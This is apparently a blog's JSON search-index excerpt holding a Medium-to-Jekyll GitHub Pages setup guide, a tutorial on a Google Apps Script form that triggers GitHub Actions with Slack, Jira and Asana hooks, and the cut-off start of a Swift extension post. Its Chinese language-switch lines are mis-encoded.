ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇStart!1. Go to Template Repo -&gt; medium-to-jekyll-starter.github.ioClick ‚ÄúUse this template‚Äù in the upper right corner -&gt; ‚ÄúCreate a new repository‚Äù2. Create...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇStart!1. Go to Template Repo -&gt; medium-to-jekyll-starter.github.ioClick ‚ÄúUse this template‚Äù in the upper right corner -&gt; ‚ÄúCreate a new repository‚Äù2. Create a new repository Repository name: Usually username_or_organization.github.io, must end with *.github.io. Must be a Public Repo to use GitHub Pages.Adjust GitHub Actions Execution Permissions After creation, due to GitHub‚Äôs security settings, you need to go to the repository settings to enable GitHub Actions execution permissions.3. Create gh-pages branch if needed On the Repo homepage, click the ‚Äúmain‚Äù branch dropdown, enter ‚Äúgh-pages‚Äù, if it does not exist, select ‚ÄúCreate branch gh-pages from main‚Äù. If the gh-pages branch already exists, or if you see ‚ÄúSorry, that branch already exists.‚Äù when creating, you can skip this step.4. Enable GitHub Pages, go to Settings -&gt; Pages -&gt; Build and deployment Select the ‚Äúgh-pages‚Äù branch, click ‚ÄúSave‚Äù to save the settings.Execute the First Deployment Repo -&gt; ‚ÄúActions‚Äù -&gt; ‚ÄúBuild and Deploy‚Äù -&gt; ‚ÄúRun workflow‚Äù -&gt; ‚ÄúBranch: main, Run workflow‚Äù.5. Wait for all deployment tasks to complete üü¢ pages build and deployment üü¢ Build and Deploy6. Go to the website to check the results https://username_or_organization.github.ioTroubleshootingIf the page only displays:--- layout: home # Index page ---It indicates that the GitHub Pages settings are incorrect or still deploying, or it may be a cached page from before. Please use a hard refresh or open the page again in incognito mode. Deployment successful for the first time! üéâüéâüéâ Please continue to set it up to sync your Medium account.Github Repo (Github Actions) Setup1. Go to the Github Actions page of your Github Repo -&gt; Click on ‚ÄúZMediumToMarkdown‚Äù -&gt; Click on ‚ÄúZMediumToMarkdown.yml‚Äù https://github.com/{ORG}/{REPO_NAME}/blob/main/.github/workflows/ZMediumToMarkdown.yml 2. Click the edit button on the right 3. Set up the parameters for automatic synchronization of Medium articlesname: ZMediumToMarkdownon: workflow_dispatch: schedule: - cron: \"10 1 15 * *\" # Runs at 01:10(UTC), everyday. # Set how often to automatically sync # ref: https://crontab.guru/jobs: ZMediumToMarkdown: runs-on: ubuntu-latest steps: - name: ZMediumToMarkdown Automatic Bot uses: ZhgChgLi/ZMediumToMarkdown@main with: command: \"--cookie_uid ${{ secrets.MEDIUM_COOKIE_UID }} --cookie_sid ${{ secrets.MEDIUM_COOKIE_SID }} -j zhgchgli_test\" # Replace zhgchgli_test with your Medium username # For example https://medium.com/@zhgchgli -&gt; zhgchgli # ref: https://github.com/ZhgChgLi/ZMediumToMarkdown?tab=readme-ov-file#usageProvide a Medium account with access permissions (Cookies). If the article is behind a paywall, you must provide it. If you find that Medium articles are not fully synced (some are missing), it means they were blocked by Medium‚Äôs firewall during syncing, and you must also provide it.Steps to obtain Medium account cookies MEDIUM_COOKIE_UID &amp; MEDIUM_COOKIE_SID: Log in to a Medium account with access, go to the Medium Dashboard Right-click in the blank area Select ‚ÄúInspect‚Äù Once the Developer Console appears, select ‚ÄúApplication‚Äù Choose ‚ÄúCookies‚Äù -&gt; ‚Äúhttps://medium.com‚Äù Scroll down to find ‚Äúsid‚Äù and ‚Äúuid‚Äù Double-click to copy the values of these two fieldsSecurely store Medium account cookies in Github Repo Secrets1. Go to Github Repo Settings -&gt; Secrets and variables -&gt; Actions -&gt; New repository secret https://github.com/{ORG}/{REPO_NAME}/settings/secrets/actions/new 2. New secret - MEDIUM_COOKIE_SID Name: MEDIUM_COOKIE_SID Secret: Paste the sid value copied from the previous step 3. New secret - MEDIUM_COOKIE_UID Name: MEDIUM_COOKIE_UID Secret: Paste the uid value copied from the previous step CompletionIf there is no special logout or issues with the account, the cookies will not expire.If the following message appears during synchronization and the articles are incomplete:This post is behind Medium's paywall. You must provide valid Medium Member login cookies to download the full post.It means the cookies have expired, please reset them by following the steps above.4. First Manual Synchronization, Repo -&gt; Github Actions -&gt; Click ‚ÄúZMediumToMarkdown‚Äù -&gt; Click ‚ÄúEnable workflow‚ÄùFor the first execution, we can manually synchronize once to check if the settings are correct.5. Wait for the synchronization of articles and website deployment to completeWait for the following three Actions to complete without errors: üü¢ ZMediumToMarkdown üü¢ pages build and deployment üü¢ Build and Deploy6. Refresh the webpage to see the results, Enjoy! ‚ö†Ô∏è Please note! All file changes will trigger: üü¢ pages build and deployment üü¢ Build and Deploy You must wait for the above two deployment tasks to complete for the website changes to take effect.Jekyll Website ConfigurationBasic Website Settings ./_config.yml Be sure to update the url: to match your GitHub Pages URL and other website settings. Sharing feature settings: ./_data/share.yml Define article author information: ./_data/authors.ymlLeft Sidebar Settings ./tabs Bottom link buttons: ./_data/contact.ymlWebsite Footer and Other Text Content Settings ./locales/{Lang}.yml default is /locales/en.ymlLocal Testing Ensure your environment has Ruby &gt;= 3.1 installed and in use. cd ./ bundle install bundle exec jekyll s Go to http://127.0.0.1:4000/ to see the results. Press Ctrl-c to stop.*Adjustments to the basic website configuration files require re-execution to take effect. üîó Copy link to share! üç∫ Buy me a beer on PayPal Improve this page on Github." }, { "title": "Google Apps Script Web AppÔΩúIntegrate Forms with GitHub Actions CI/CD for Streamlined Workflows", "url": "/posts/zrealm-dev/google-apps-script-web-app-integrate-forms-with-github-actions-ci-cd-for-streamlined-workflows-4cb4437818f2/", "categories": "ZRealm Dev.", "tags": "ios-app-development, google-apps-script, github-actions, slack, github, english, ai-translation", "date": "2025-01-11 19:19:43 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Using Google Apps Script Web App Form to Integrate with Github Action CI/CD Wo...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Using Google Apps Script Web App Form to Integrate with Github Action CI/CD WorkflowsGithub Action Workflow form optimization and integration with other workflow tools (Jira, Asana, Slack, etc.) to improve development efficiency.Left: Original Github Action Workflow Form / Right: Final Result (GAS Web App Form)2025/07 Update:This feature has been integrated into the actual packaging tool. Please refer to the latest article case: ‚ÄúCI/CD Practical Guide (4): Using Google Apps Script Web App to Connect GitHub Actions and Build a Free and Easy Packaging Tool Platform‚ÄùBackgroundThe previous team used GitHub Actions &amp; Self-hosted GitHub Runner + Slack to build a complete CI/CD service; the overall effect was good. For app developers, setting up and maintaining it was relatively easy. Just follow the official documentation to configure the YAML parameters, and it would trigger automatically. On the machine side, it was also easy to use your own machine as a runner. The service itself is maintained by GitHub, so we didn‚Äôt have to worry about version upgrades. The runner actively pulls tasks from GitHub, so there was no need to open external network ports. It offers the benefits of a Bitrise-like GUI YAML build system along with the flexibility and lower build costs of using self-hosted machines like Jenkins, without the need to spend time maintaining the service itself like Jenkins requires. Will write a complete guide on App CI/CD with GitHub Actions when I have time in the future.Problem: Github Action CI/CD GUI FormGithub Action GUI Form In app development, when triggering CD to build a test version, release version, or submit for review, it usually requires providing some external parameters or selecting the environment and branch according to needs before starting the workflow.Unlike Jenkins, which is a self-hosted service with a complete Web GUI, GitHub Actions does not have one. The only Web GUI form is the simple form you can customize under Actions by clicking Run workflow, allowing users to input external parameters and trigger the CI/CD workflow.Users who typically use this CD packaging are not necessarily the app developers themselves, nor do they always have permissions for the project. For example, QA may need to package a specific version, or PM/Backend may need to package a development version for testing. The GitHub Action Form requires project permissions to use, but users may not have project permissions or even an engineering background.And we cannot perform dynamic forms or data validation here. Therefore, we need to create a separate GUI service for other users to operate.Building a Custom Slack App SolutionPreviously, team members passionate about automation built a complete Slack App web service using Kotlin+Ktor. It integrated Slack messages, forms, commands, and more to receive and forward CD packaging requests, trigger GitHub Actions, and send results back to Slack. Currently, there are no development resources to build the service using Kotlin+Ktor as beforeWriting Your Own Web/iOS/macOS App ToolThe team originally used Jenkins, which has a basic web interface for other users to log in and use. Additionally, they developed an app that connects to Jenkins, packaging some parameters to make it easier for non-engineering users. However, this whole system was abandoned after migrating to GitHub Actions.‚ùå Private Github PagesIt is possible to directly build GitHub Pages as a CI/CD Web GUI, but currently only GitHub Enterprise allows setting access permissions for GitHub Pages. Other options, even with Private Repos, will be public and lack security.‚ùå Slack App, but built with Google Apps ScriptAt first, we considered using a Slack App as the CI/CD GUI form service based on our team‚Äôs previous experience. However, we currently lack the resources to build the service with Kotlin+Ktor as before; so we decided to quickly try building it using a Function as a Service platform.There are many types of Function as a Service. Cloud Functions offers more flexibility, but due to organizational IT restrictions, creating public cloud functions freely is not allowed and there are cost concerns. Therefore, we return to our old friend ‚Äî Google Apps Script. Previously, I have written several articles about automation with Google Apps Script. Interested readers can refer to them: 1. ‚ÄúAutomate Daily Data Reports with Google Apps Script RPA‚Äú 2. ‚ÄúSimple 3 Steps ‚Äî Build a Free GA4 Automated Data Notification Bot ‚Äú 3. ‚ÄúCrashlytics + Google Analytics Automatic Query for App Crash-Free Users Rate‚Äù 4. Crashlytics + Big Query to Build a More Real-Time and Convenient Crash Tracking ToolIn summary, Google Apps Script is another Function as a Service offered by Google, mainly featuring free usage and fast integration with Google services. However, it has more limitations, such as only supporting its own language, a maximum execution time of 6 minutes, limits on the number of executions, no support for multithreading, and more. For details, please refer to my previous article.The conclusion is that it is not feasible, because: Function as a Service cold start issue.If the service is idle for a while, it goes to sleep, and the next call takes longer to start (3 to ‚â• 5 seconds). Slack App is very strict about API response time; the service must respond within 3 seconds or it is considered a failure. Slack will then throw an error, and event listening will be considered lost, causing repeated sends. Google Apps Script doGet, doPost methods cannot access Headers.This causes failure to use official security verification and inability to disable Slack Retry. Google Apps Script single-threading issue.If connecting to other services takes more than 3 seconds to respond, Slack will directly mark it as failed. I reluctantly tried using Slack messages, Block Kit, and Forms to connect the entire process, but it was too prone to the issues mentioned above, so I eventually gave up. If you want to build this system, you still need to run your own server and services; do not use Function as a Service!‚ùå Slack Workflow FormSlack Workflow Form (‚ùå Not customizable)Also tried Slack‚Äôs built-in automation feature Workflow Form, but it cannot support dynamic form content (e.g., fetching branches for user selection). The only customizable part is the subsequent data submission step.‚úÖ Google Apps Script Web App GUI FormIf the mountain doesn‚Äôt move, the road will. On second thought, there‚Äôs no need to insist on integrating with Slack. Slack integration is the best solution since it fits directly into the existing team collaboration tool without requiring learning a new tool. However, due to resource constraints, we have to settle for other stable and easy-to-use methods. Looking back, Google Apps Script itself can be deployed as a Web App, responding with a GUI form during the Web doGet. After submitting the form, it triggers subsequent GitHub integration processes.Final Result üéâDemo Web App FormWorkflowWe use Google Apps Script Web App to build a CI/CD form, directly linked to Google Workspace accounts, restricting access to users within the organization. It automatically obtains the current logged-in user‚Äôs email, uses a shared GitHub Repo account (or borrows a personal access token from an authorized account) to call the GitHub API to get the branch list. Upon submission, it also calls the API to trigger GitHub Actions to start the CI/CD workflow.Additionally, we can use the user‚Äôs email to call the Slack API via the Slack App to get the user‚Äôs Slack ID, then send messages through the Slack App to notify the CI/CD task execution status.It can also be integrated with other tools and development processes, such as retrieving tasks from Asana or Jira, selecting them, then using the GitHub API to find branches and trigger GitHub Actions, and finally notifying users through Slack.Step 1. Create Google Apps Script Web App FormGo to &gt; Google Apps Script and create a new project.Step 2. Create Form Content and GAS ScriptHaven‚Äôt written HTML for a long time and too lazy to design styles myself, so I asked ChatGPT to generate a slightly styled HTML form template directly.In the GAS file list on the left, click ‚Äú+‚Äù to add a new file, enter the file name Form.html, and paste the GPT-generated HTML form template content.Form.html:&lt;!--HTML &amp; Style Gen by ChatGPT 4o--&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt; &lt;title&gt;&lt;?=title?&gt;&lt;/title&gt; &lt;style&gt; body { font-family: Arial, sans-serif; margin: 0; padding: 20px; background-color: #f7f7f7; } .form-container { max-width: 600px; margin: auto; padding: 20px; background-color: #ffffff; border-radius: 8px; box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1); } .form-container h2 { margin-bottom: 20px; color: #333333; } .form-group { margin-bottom: 15px; } .form-group label { display: block; margin-bottom: 5px; font-weight: bold; color: #555555; } .form-group input, .form-group select, .form-group textarea { width: 95%; padding: 10px; border: 1px solid #cccccc; border-radius: 4px; font-size: 16px; } .form-group input[type=\"radio\"] { width: auto; margin-right: 10px; } .form-group .radio-label { display: inline-block; margin-right: 20px; } .form-group button { background-color: #4CAF50; color: white; padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; } .form-group button:hover { background-color: #45a049; } .message { margin-top: 20px; padding: 15px; border-radius: 5px; font-size: 1em; text-align: center; } .message.success { background-color: #d4edda; color: #155724; border: 1px solid #c3e6cb; } .message.error { background-color: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; } .hidden { display: none; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=\"form-container\"&gt; &lt;h2&gt;&lt;?=title?&gt;&lt;/h2&gt; &lt;form id=\"myForm\"&gt; &lt;div id=\"message-block\" class=\"hidden\"&gt;&lt;/div&gt; &lt;div class=\"form-group\"&gt; &lt;label for=\"email\"&gt;Email:&lt;/label&gt; &lt;input type=\"email\" value=\"&lt;?=email?&gt;\" readonly/&gt; &lt;/div&gt; &lt;div class=\"form-group\"&gt; &lt;label for=\"buildNumber\"&gt;Build Number:&lt;/label&gt; &lt;input type=\"number\" value=\"&lt;?=buildNumber?&gt;\"/&gt; &lt;/div&gt; &lt;div class=\"form-group\"&gt; &lt;label for=\"branch\"&gt;PRs Under Review:&lt;/label&gt; &lt;select id=\"branch\" name=\"branch\"&gt; &lt;option&gt;Please select&lt;/option&gt; &lt;? pullRequests.forEach(pullRequest =&gt; { ?&gt; &lt;option value=\"&lt;?=pullRequest.head.ref?&gt;\"&gt;[&lt;?=pullRequest.state?&gt;] &lt;?=pullRequest.title?&gt;&lt;/option&gt; &lt;? }); ?&gt; &lt;/select&gt; &lt;/div&gt; &lt;div class=\"form-group\"&gt; &lt;label for=\"message\"&gt;Update Details:&lt;/label&gt; &lt;textarea id=\"message\" name=\"message\" rows=\"4\" placeholder=\"Please enter your message\"&gt;&lt;/textarea&gt; &lt;/div&gt; &lt;div class=\"form-group\"&gt; &lt;button type=\"submit\"&gt;Submit&lt;/button&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; &lt;script&gt; function displayMessage(ok, message) { const messageBlock = document.getElementById('message-block'); messageBlock.className = ok ? 'message success' : 'message error'; messageBlock.innerHTML = message; messageBlock.classList.remove('hidden'); } document.getElementById(\"myForm\").addEventListener(\"submit\", function(e) { e.preventDefault(); const formData = new FormData(this); const formObject = Object.fromEntries(formData); google.script.run.withSuccessHandler((response) =&gt; { displayMessage(response.ok, response.message); }).processForm(formObject); }); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;The form content can be adjusted according to your needs.code.gs:function doGet(e) { // Corresponds to the file Form.html on the left const htmlTemplate = HtmlService.createTemplateFromFile('Form'); const email = Session.getActiveUser().getEmail(); // Get user email, valid only for execution identity: user accessing the web app const title = \"App CD Packaging Request Form\"; const buildNumber = genBuildNumber(); htmlTemplate.email = email; htmlTemplate.title = title; htmlTemplate.pullRequests = []; // Next step: connect with Github... htmlTemplate.buildNumber = buildNumber; const html = htmlTemplate.evaluate(); html.setTitle(title); //html.setWidth(600) // Set page width return html}function processForm(object) { return {\"ok\": true, \"message\": \"Request submitted successfully!\"};}function genBuildNumber() { const now = new Date(); const formattedDate = Utilities.formatDate(now, \"Asia/Taipei\", \"yyyyMMddHHmmss\"); const milliseconds = now.getMilliseconds().toString().padStart(3, '0'); // Ensure milliseconds are 3 digits return `${formattedDate}${milliseconds}`; }In this step, we first complete the form GUI. Next, we will connect to the GitHub API to get the list of PR branches.Step 2. Deploy Google Apps Script Web App FormLet‚Äôs first deploy the content we just created and check the results.In the top right corner of GAS, select ‚ÄúDeploy‚Äù -&gt; ‚ÄúNew deployment‚Äù -&gt; ‚ÄúWeb app‚Äù:The execution identity and access permissions can be set separately as:Execution Identity: I run the script consistently using your account identity. The user accessing the web app will run the script as their currently logged-in Google account. Who can access: Only myself XXX All users within the same organization Only users in the same organization with a logged-in Google account can access. All signed-in Google account users Signed-in Google account users can access. Everyone does not need to sign in with a Google account; access is open to all. We choose ‚ÄúWho has access: All users in the same organization XXX‚Äù + ‚ÄúExecute as: User accessing the web app‚Äù to automatically restrict access to organization accounts only, and run with their own identity! It‚Äôs a very convenient feature for permission management!After selection, click ‚ÄúDeploy‚Äù at the bottom right.The URL in the web application is the access URL for the Web App.https://script.google.com/macros/s/AKfycbw8SuK7lLLMdY86y3jxMJyzXqa5tdxJryRnteOnNi-lK--j6CmKYXj7UuU58DiS0NSVvA/exec The URL is very long and ugly, but there is no choice; you have to use a URL shortener tool.Click the link to open the page and see the effect:Here are two more limitations of GAS: Warning message at the top of GAS Web App cannot be hidden by default GAS Web App uses an IFrame to embed our page, making it difficult to achieve 100% RWD (Responsive Web Design) effect.You can only use .setWidth() to adjust the window width. Google Apps Script Authorization WarningFirst time use, clicking ‚ÄúDebug‚Äù or ‚ÄúRun‚Äù may trigger the following authorization warning:Select the account you want to use. If you see ‚ÄúThis app isn‚Äôt verified by Google,‚Äù click ‚ÄúAdvanced‚Äù -&gt; ‚ÄúGo to XXX (unsafe),‚Äù then choose ‚ÄúAllow‚Äù:If the GAS script permissions change (e.g., adding access to Google Sheets, etc.), re-authorization is required; otherwise, once authorized, it will not prompt again. If you encounter: Access to ‚ÄúXXX‚Äù is blocked due to incomplete Google verification, please refer to my latest article on GCP settings.Step 3. Connect to GitHub API to Get PR Branch ListWe add a new Github.gs file to store the GitHub API related logic.Github.gs:// SECRETconst githubPersonalAccessToken = \"\"// Use your GitHub account or a shared GitHub account within your organization to create a PAT// https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/managing-your-personal-access-tokens// Method 1: Access via Restful APIfunction githubAPI(method, path, payload = null) { try { const url = \"https://api.github.com\"+path; var options = { method: method, headers: { \"Accept\": \"application/vnd.github+json\", \"Authorization\": `Bearer ${githubPersonalAccessToken}`, \"X-GitHub-Api-Version\": \"2022-11-28\" } }; if (method.toLowerCase().trim() == \"post\") { options.payload = JSON.stringify(payload); } const response = UrlFetchApp.fetch(url, options); const data = JSON.parse(response.getContentText()); return data; } catch (error) { throw error; }}// Method 2: Access via GraphQL// Some detailed queries are only available via GitHub's GraphQL API// https://docs.github.com/en/graphqlfunction githubGraphQL(query, variables) { const url = \"https://api.github.com/graphql\"; const payload = { query: query, variables: variables }; const options = { method: \"post\", contentType: \"application/json\", headers: { \"Accept\": \"application/vnd.github+json\", \"Authorization\": `Bearer ${githubPersonalAccessToken}`, \"X-GitHub-Api-Version\": \"2022-11-28\" }, payload: JSON.stringify(payload) }; try { const response = UrlFetchApp.fetch(url, options); const data = JSON.parse(response.getContentText()); return data; } catch (error) { throw error; }}// GraphQL Example:// const query = `// query($owner: String!, $repo: String!) {// repository(owner: $owner, name: $repo) {// pullRequests(states: OPEN, first: 100, orderBy: { field: CREATED_AT, direction: DESC }) {// nodes {// title// url// number// createdAt// author {// login// }// headRefName// baseRefName// body// }// pageInfo {// hasNextPage// endCursor// }// }// }// }// `;// const variables = {// owner: \"swiftlang\",// repo: \"swift\"// };// const response = githubGraphQL(query, variables);There are two ways to access the GitHub API: the traditional Restful method and the more flexible GraphQL; this article uses Restful as an example.code.gs:function doGet(e) { // Corresponds to the Form.html file on the left const htmlTemplate = HtmlService.createTemplateFromFile('Form'); const email = Session.getActiveUser().getEmail(); // Get user email, valid only if execution identity is the user accessing the web app const title = \"App CD Packaging Request Form\"; const pullRequests = githubAPI(\"get\", \"/repos/swiftlang/swift/pulls\"); // Example: https://github.com/swiftlang/swift/pulls const buildNumber = genBuildNumber(); htmlTemplate.email = email; htmlTemplate.title = title; htmlTemplate.pullRequests = pullRequests; htmlTemplate.buildNumber = buildNumber; const html = htmlTemplate.evaluate(); html.setTitle(title); //html.setWidth(600) // Set page width return html}function processForm(object) { if (object.buildNumber == \"\") { return {\"ok\": false, \"message\": \"Please enter the build number!\"}; } if (object.branch == \"\") { return {\"ok\": false, \"message\": \"Please select a branch version!\"}; } // Parameters to pass to GitHub Action const payload = { ref: object.branch, inputs: { buildNumber: object.buildNumber } }; // try { const response = githubAPI(\"post\", \"/repos/zhgchgli0718/ios-project-for-github-action-ci-cd-demo/actions/workflows/CD-Job.yml/dispatches\", payload); // Example: https://github.com/zhgchgli0718/ios-project-for-github-action-ci-cd-demo/blob/main/.github/workflows/CD-Job.yml return {\"ok\": true, \"message\": `Packaging request sent successfully!&lt;br/&gt;Branch: &lt;strong&gt;${object.branch}&lt;/strong&gt;&lt;br/&gt;Build Number: &lt;strong&gt;${object.buildNumber}&lt;/strong&gt;`}; } catch (error) { return {\"ok\": false, \"message\": \"An error occurred: \"+error.message}; }}The processForm method handles the form submission and can also include additional processing.GAS x Github API x Github ActionHere is some additional information corresponding to the Github Action.CD-Job.yml:# CD Packaging Jobname: CD-Jobon: workflow_dispatch: inputs: buildNumber: # Corresponds to GAS payload.inputs.xxx description: 'Version number' required: false type: string # ...More # For input types, refer to official docs: https://docs.github.com/en/actions/writing-workflows/workflow-syntax-for-github-actions#onworkflow_dispatchinputs jobs: some-job: runs-on: ubuntu-latest steps: - name: Print Inputs run: \\\\| echo \"Release Build Number: ${{ github.event.inputs.buildNumber }}\" Step 4. Redeploy Google Apps Script Web App Form ‚ö†Ô∏èPlease note that any changes to the GAS code require redeployment to take effect.‚ö†Ô∏è ‚ö†Ô∏è Please note that any changes to the GAS code require redeployment to take effect. ‚ö†Ô∏è ‚ö†Ô∏èPlease note that any changes to the GAS code require redeployment to take effect.‚ö†Ô∏èIn GAS, click ‚ÄúDeploy‚Äù at the top right -&gt; select ‚ÄúEdit‚Äù at the top right -&gt; choose ‚ÄúCreate new version‚Äù under VersionsClick ‚ÄúDeploy‚Äù -&gt; Done.Go back to the webpage and refresh to see the updated results: ‚ö†Ô∏è Please note that any changes to the GAS code require redeployment to take effect. ‚ö†Ô∏è ‚ö†Ô∏èPlease note that any changes to the GAS code require redeployment to take effect.‚ö†Ô∏è ‚ö†Ô∏èPlease note that any changes to the GAS code require redeployment to take effect.‚ö†Ô∏èDone! üéâüéâüéâDemo Web App FormYou can now share this link within your organization, allowing your teammates to directly use this web GUI to execute CI/CD tasks.Extension (1) ‚Äî Query Slack User ID Using User‚Äôs Email &amp; Send/Update Progress NotificationsAs mentioned earlier, we want to notify users promptly about the CI/CD execution status. We can use the email provided by the user to look up their Slack User ID.Slack.gs:const slackBotToken = \"\"// https://medium.com/zrealm-robotic-process-automation/slack-chatgpt-integration-bd94cc88f9c9function slackRequest(path, content) { const options = { method: \"post\", contentType: \"application/json\", headers: { Authorization: `Bearer ${slackBotToken}`, // Use the bot token for authorization, 'X-Slack-No-Retry': 1 }, payload: JSON.stringify(content) }; try { const response = UrlFetchApp.fetch(\"https://slack.com/api/\"+path, options); const responseData = JSON.parse(response.getContentText()); if (responseData.ok) { return responseData } else { throw new Error(`Slack: ${responseData.error}`); } } catch (error) { throw error; }}// Look up Slack UID by emailfunction getSlackUserId(email) { return slackRequest(`users.lookupByEmail?email=${encodeURIComponent(email)}`)?.user?.id;}// Send message to target Slack UID (channelID)function sendSlackMessage(channelId, ts = null, value) { var content = { channel: channelId }; if (ts != null) { content.thread_ts = ts; } if (typeof value === \"string\") { content.text = value; } else { content.blocks = value; } return slackRequest(\"chat.postMessage\", content);}// Update sent message contentfunction updateSlackMessage(channelId, ts = null, value) { var content = { channel: channelId }; if (ts != null) { content.ts = ts; } if (typeof value === \"string\") { content.text = value; } else { content.blocks = value; } return slackRequest(\"chat.update\", content);}For Slack API usage, please refer to the official documentation.GitHub Action YAML can use this Action to continuously update messages and send Slack notifications:# ...on: workflow_dispatch: inputs: buildNumber: # Corresponds to GAS payload.inputs.xxx description: 'Version number' required: false type: string # ...More SLACK_USER_ID: description: 'Slack User Id for receiving action notification' type: string SLACK_CHANNEL_ID: description: 'Slack Channel Id for receiving action notification' type: string SLACK_THREAD_TS: description: 'Slack message ts' type: string jobs: # some jobs... if-deploy-failed-message: runs-on: ubuntu-latest if: failure() - name: update slack message uses: slackapi/slack-github-action@v2.0.0 with: method: chat.update token: ${{ secrets.SLACK_BOT_TOKEN }} payload: \\\\| channel: ${{ github.event.inputs.SLACK_CHANNEL_ID }} ts: ${{ github.event.inputs.SLACK_THREAD_TS }} text: \"‚ùå Packaging task failed, please check the execution status or try again later.\\n&lt;${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}\\\\|Click here to view the status&gt; cc'ed &lt;@${{ github.event.inputs.SLACK_USER_ID }}&gt;\"Effect: For details on Slack App integration, please refer to my previous article: Slack &amp; ChatGPT Integration .Extension (2) ‚Äî Query Jira TicketsJira.gs:const jiraPersonalAccessToken = \"\"// https://confluence.atlassian.com/enterprise/using-personal-access-tokens-1026032365.htmlfunction getJiraTickets() { const url = `https://xxx.atlassian.net/rest/api/3/search`; // JQL query const jql = `project = XXX`; const queryParams = { jql: jql, maxResults: 50, // Adjust as needed }; const options = { method: \"get\", headers: { Authorization: \"Basic \" + jiraPersonalAccessToken, \"Content-Type\": \"application/json\", }, muteHttpExceptions: true, }; const queryString = Object.keys(queryParams).map(key =&gt; `${encodeURIComponent(key)}=${encodeURIComponent(queryParams[key])}`).join(\"&amp;\"); const response = UrlFetchApp.fetch(url + \"?\" + queryString + \"&amp;fields=\", options); // could specify only return some fields if (response.getResponseCode() === 200) { const issues = JSON.parse(response.getContentText()).issues; return issues; } else { Logger.log(`Error: ${response.getResponseCode()} - ${response.getContentText()}`); throw new Error(\"Failed to fetch Jira issues.\"); }} For other Jira API usages, please refer to the official documentation .Extension (3) ‚Äî Query Asana TasksAsana.gs:const asanaPersonalAccessToken = \"\"// https://developers.asana.com/docs/personal-access-tokenfunction asanaAPI(endpoint, method = \"GET\", data = null) { var options = { \"method\" : method, \"contentType\" : \"application/json\", \"headers\": { \"Authorization\": \"Bearer \"+asanaPersonalAccessToken } }; if (data != null) { options[\"payload\"] = JSON.stringify({\"data\":data}); } const url = \"https://app.asana.com/api/1.0\"+endpoint; const res = UrlFetchApp.fetch(url, options); const data = JSON.parse(res.getContentText()); return data;}// Find tasks in project// asanaAPI(\"/projects/PROJECT_ID/tasks\");For other Asana API usage, please refer to the official documentation.SummaryAutomation, work, and development process optimization never lack technology, but ideas; as long as we have ideas, we can find the right technology to realize them. Let‚Äôs encourage each other!2025/07 Update:This feature has been integrated into the actual packaging tool. Please refer to the latest article case: ‚ÄúCI/CD Practical Guide (4): Using Google Apps Script Web App to Connect GitHub Actions and Build a Free and Easy Packaging Tool Platform‚ÄùIf you have any questions or suggestions, feel free to contact me . üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "Swift Native Type ExtensionsÔΩúElegant Namespace Implementation for Cleaner Code", "url": "/posts/zrealm-dev/swift-native-type-extensions-elegant-namespace-implementation-for-cleaner-code-a8925ad9ed01/", "categories": "ZRealm Dev.", "tags": "english, ai-translation, ios-app-development, swift, wrapper, app-modularization, ios", "date": "2025-01-01 22:02:32 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off![Swift] An Elegant Native Type Extension MethodEncapsulate extension methods t...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off![Swift] An Elegant Native Type Extension MethodEncapsulate extension methods to provide Namespace functionalityhttps://www.swift.org/ The exact source of this method is unclear; it was learned from a skilled colleague‚Äôs code.Native Type ExtensionsIn daily iOS/Swift development, we often need to extend native APIs and write our own helpers.The following example extends UIColor, allowing it to convert to a HEX Color String:extension UIColor { /// Convert a UIColor to a hex string representation. /// - Returns: A hex string (e.g., \"#RRGGBB\" or \"#RRGGBBAA\"). func toHexString(includeAlpha: Bool = false) -&gt; String? { var red: CGFloat = 0 var green: CGFloat = 0 var 